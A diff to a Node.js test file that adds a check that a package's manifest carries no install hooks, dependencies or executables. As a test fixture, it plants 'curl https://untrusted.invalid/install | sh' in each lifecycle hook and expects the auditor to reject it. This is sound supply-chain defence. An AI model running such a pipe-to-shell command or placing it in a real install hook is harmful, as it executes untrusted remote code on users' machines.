@@ -1,7 +1,7 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { readFileSync } from "node:fs";
-import { auditPackageExports, auditPackedBrandBoundary, auditPackedRuntimeBoundary } from "../scripts/package-audit.mjs";
+import { auditPackageExports, auditPackedBrandBoundary, auditPackedRuntimeBoundary, auditPackageInstallSafety } from "../scripts/package-audit.mjs";
 const pkg=JSON.parse(readFileSync(new URL("../package.json",import.meta.url),"utf8"));
 const files=new Set(["package.json","README.md","LICENSE","src/index.js","src/index.d.ts",
   "src/theme.js","src/theme.d.ts","src/foundation.js","src/foundation.d.ts","src/tokens.css"]);
@@ -69,4 +69,28 @@ test("npm file allowlist contains only verified web runtime resources",()=>{
  }
  const missing=new Set([...allowed]);missing.delete("src/foundation.d.ts");
  assert.throws(()=>auditPackedRuntimeBoundary(missing),/Missing minimal web foundation files/);
+});
+
+test("normal consumer install may not invoke hidden lifecycle hooks or dependency payloads",()=>{
+  assert.equal(auditPackageInstallSafety(pkg),true);
+  const clone=x=>JSON.parse(JSON.stringify(x));
+  for(const hook of ["preinstall","install","postinstall","preuninstall",
+    "uninstall","postuninstall","prepare","postpack","prepublish",
+    "publish","postpublish","dependencies"]){
+    const suspect=clone(pkg);
+    suspect.scripts[hook]="curl https://untrusted.invalid/install | sh";
+    assert.throws(()=>auditPackageInstallSafety(suspect),/Disallowed npm lifecycle hook/,hook);
+  }
+  for(const field of ["dependencies","devDependencies","optionalDependencies",
+    "peerDependencies","bundledDependencies","bundleDependencies"]){
+    const suspect=clone(pkg);suspect[field]=field.includes("bundle")?["some-lib"] : {"some-lib":"*"};
+    assert.throws(()=>auditPackageInstallSafety(suspect),/Unreviewed package dependency surface/,field);
+  }
+  const command=clone(pkg);command.scripts.prepack="node remote.js";
+  assert.throws(()=>auditPackageInstallSafety(command),/Unreviewed npm lifecycle command/);
+  const publication=clone(pkg);publication.scripts.prepublishOnly="echo skip gate";
+  assert.throws(()=>auditPackageInstallSafety(publication),/Unreviewed npm lifecycle command/);
+  const binary=clone(pkg);binary.bin={"ui":"scripts/something.js"};
+  assert.throws(()=>auditPackageInstallSafety(binary),/executable/);
+  assert.throws(()=>auditPackageInstallSafety(null),TypeError);
 });
